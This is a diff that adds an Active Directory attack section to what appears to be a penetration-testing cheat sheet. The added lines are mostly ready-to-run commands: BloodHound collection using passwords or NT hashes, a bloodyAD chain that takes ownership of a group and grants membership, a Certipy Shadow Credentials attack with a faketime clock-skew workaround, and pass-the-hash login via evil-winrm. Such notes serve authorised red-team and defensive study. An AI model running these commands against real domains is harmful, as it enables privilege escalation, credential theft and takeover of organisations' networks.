@@ -1254,6 +1254,63 @@ bloodhound
 # Mark owned principals → re-run "Shortest Paths from Owned Principals"
 ```
 
+### BloodHound collection
+```bash
+# Collect via Python collector instead of dropping SharpHound.exe on target
+pipx install bloodhound
+bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc_ip> -c All
+
+# Or with an NT hash instead of password
+bloodhound-python -u <user> --hashes :<nt_hash> -d <domain> -ns <dc_ip> -c All
+
+# Package results for upload
+zip loot_bh.zip *.json
+
+
+# BloodHound CE (Docker-based, replaces legacy neo4j+bloodhound binary setup)
+cd ~/tools/bloodhound-ce
+sudo docker compose up -d
+sudo docker compose logs bloodhound | grep -i password   # grab initial admin password on first run
+
+# UI: http://localhost:8080
+# Quick Upload -> select zip
+# Explore -> search owned principal -> right-click -> Mark as Owned
+# Run pre-built query: "Shortest Paths from Owned Objects"
+
+
+ACL Abuse — WriteOwner -> GenericWrite chain (bloodyAD, modern cross-platform tool)
+pipx install bloodyAD
+
+# 1. Take ownership of the group you have WriteOwner over
+bloodyAD --host <dc_hostname> -d <domain> -u <user> -p <pass> set owner <GROUP> <user>
+
+# 2. Grant yourself GenericAll now that you own it (ownership alone grants no rights)
+bloodyAD --host <dc_hostname> -d <domain> -u <user> -p <pass> add genericAll <GROUP> <user>
+
+# 3. Add yourself as a member, inheriting the group's rights over its downstream target
+bloodyAD --host <dc_hostname> -d <domain> -u <user> -p <pass> add groupMember <GROUP> <user>
+
+# Verify membership took
+bloodyAD --host <dc_hostname> -d <domain> -u <user> -p <pass> get object <user> --attr memberOf
+
+
+# Shadow Credentials Attack (Certipy) - abuse GenericWrite/GenericAll for passwordless auth
+pipx install certipy-ad
+
+certipy shadow auto -u <attacker_user>@<domain> -p <attacker_pass> -account <target_account> -dc-ip <dc_ip>
+
+# With a hash instead of password (chaining multiple hops)
+certipy shadow auto -u <attacker_user>@<domain> -hashes <nt_hash> -account <target_account> -dc-ip <dc_ip>
+
+# Kerberos Clock Skew Fix (common blocker for PKINIT/TGT requests, tolerance ~5 min)
+sudo apt install faketime -y
+faketime '+7 hours 1 minutes' certipy shadow auto -u <user>@<domain> -p <pass> -account <target> -dc-ip <dc_ip>
+
+# Connect with retrieved NTLM
+evil-winrm -i <dc_ip> -u <target> -H <nt_hash>
+
+```
+
 ### LDAP Enumeration from Linux
 ```bash
 # ldapsearch
